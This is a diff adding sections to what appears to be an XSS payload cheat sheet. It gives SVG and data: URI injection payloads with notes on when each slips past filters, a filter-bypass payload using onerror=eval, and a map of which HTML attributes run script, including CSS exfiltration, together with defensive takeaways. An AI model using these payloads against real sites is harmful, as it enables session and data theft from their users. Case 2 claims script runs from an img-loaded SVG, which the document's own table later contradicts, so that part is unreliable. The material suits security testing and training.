@@ -525,3 +525,211 @@ Full payload ladder is in `bypass-no-parentheses.md`.
 | No `throw` | `TypeError.prototype.name='=/',0[onerror=eval]['/-alert(1)//']` |
 
 ---
+
+
+## 21. SVG + data: Scheme Payloads
+
+### Case 1 — Inline `<script>` inside SVG (direct injection)
+
+```html
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+```
+
+**How it works:** Browser parses SVG in XML mode; `<script>` is valid in SVG namespace and executes directly.
+
+**When to use:** No tag filtering; SVG is allowed in the injection point.
+
+---
+
+### Case 2 — `<img>` loading SVG via `data:image/svg+xml` with `onload`
+
+```html
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(2)'></svg>">
+```
+
+**How it works:** Browser fetches the data URI as an SVG image; `onload` fires in the SVG context triggering the payload.
+
+**When to use:** `<img>` tag allowed; `data:` scheme not blocked; direct SVG injection filtered.
+
+---
+
+### Case 3 — `<object>` loading SVG via `data:image/svg+xml` with inline `<script>`
+
+```html
+<object data="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(4)</script></svg>" type="image/svg+xml"></object>
+```
+
+**How it works:** `<object>` embeds the SVG as an external document; the embedded `<script>` runs in its own browsing context.
+
+**When to use:** `<object>` tag allowed; `data:` scheme permitted; other vectors blocked.
+
+---
+
+### Quick Reference
+
+| # | Vector | Payload |
+|---|--------|-------|
+| 1 | Direct SVG inline script | `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>` |
+| 2 | img + data:image/svg+xml + onload | `<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(2)'></svg>">` |
+| 3 | object + data:image/svg+xml + script | `<object data="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(4)</script></svg>" type="image/svg+xml"></object>` |
+
+---
+
+
+---
+
+## 22. XSS Surface Mapping: `src`, `href`, `action`
+
+> Use it, break it, and then come back with where your assumptions failed — that's where you actually level up.
+
+### Core Principle
+
+Execution is NOT decided by the payload alone.
+It is decided by:
+
+* The **HTML element**
+* The **context (resource vs document)**
+* The **browser parsing mode**
+
+---
+
+### Tags That Use `src`
+
+#### Execution-capable (HIGH RISK)
+
+**`<iframe src>`**
+* Loads a full document
+* Supports `data:`
+* Executes HTML/SVG
+
+**`<embed src>`**
+* Similar to iframe/object
+* Browser-dependent
+
+#### Document-capable via `data`
+
+**`<object data>`**
+* Can render HTML, SVG, PDF
+* Treated as document
+* High risk when SVG allowed
+
+#### Resource-only (NO JS EXECUTION)
+
+**`<img src>`**
+* Loads image only
+* SVG scripts DO NOT execute
+
+**`<audio src>` / `<video src>`**
+* Media only
+
+**`<source src>`**
+* Used inside media tags
+
+---
+
+### Tags That Use `href`
+
+#### Navigation-based
+
+**`<a href>`**
+* Can trigger `javascript:` (if not filtered)
+* Executes on click
+
+**`<area href>`**
+* Same as `<a>` but inside image maps
+
+#### Resource loading
+
+**`<link href>`**
+* Loads CSS
+* No JS execution
+* Can be abused for CSS injection
+
+---
+
+### Tags That Use `action`
+
+**`<form action>`**
+* Controls submission target
+* No JS execution directly
+* Can be abused for: data exfiltration, CSRF chaining
+
+---
+
+### Data URI Behavior
+
+| Element | Supports `data:` | Execution |
+|---------|-----------------|-----------|
+| iframe | Yes | ✅ Yes |
+| object | Yes | ✅ Yes |
+| embed | Yes | ✅ Yes |
+| img | Yes | ❌ No |
+| link | Yes | ❌ No |
+| audio/video | Yes | ❌ No |
+
+---
+
+### SVG-Specific Notes
+
+* SVG behaves like a **document** in: `<iframe>`, `<object>`, `<embed>`
+* SVG behaves like an **image** in: `<img>`
+
+---
+
+### Common Misconceptions
+
+| # | Misconception | Reality |
+|---|--------------|---------|
+| 1 | Execute JS via `<img src>` even with SVG | Scripts won't run |
+| 2 | Execute JS via CSS `url()` | Only triggers network requests |
+| 3 | Import JS using CSS `@import` | Only CSS allowed |
+| 4 | Encoding = execution | Encoding only bypasses filters, does not change execution context |
+| 5 | MIME type filtering is sufficient | Same MIME behaves differently per tag |
+
+---
+
+### Real Attack Surfaces
+
+**SVG as Document**
+* `<iframe src="data:image/svg+xml,...">`
+* `<object data="data:image/svg+xml,...">`
+
+**CSS Exfiltration**
+* `@font-face` + `unicode-range`
+* Background requests
+
+**Navigation Abuse**
+* `javascript:` in `href`
+
+---
+
+### Defensive Takeaways
+
+* Block `image/svg+xml` unless strictly needed
+* Restrict where user-controlled URLs are injected
+* Treat `<iframe>`, `<object>`, `<embed>` as HIGH RISK
+* Do not rely only on encoding filters or MIME restrictions
+
+---
+
+### Mental Model
+
+```
+INPUT → CONTEXT → PARSER → EXECUTION
+```
+
+NOT:
+
+```
+INPUT → PAYLOAD → RESULT
+```
+
+---
+
+### Test Checklist
+
+- [ ] Try same payload across `<iframe>`, `<object>`, `<img>`
+- [ ] Observe: execution vs rendering vs network request
+- [ ] Identify: document context vs resource context
+
+---
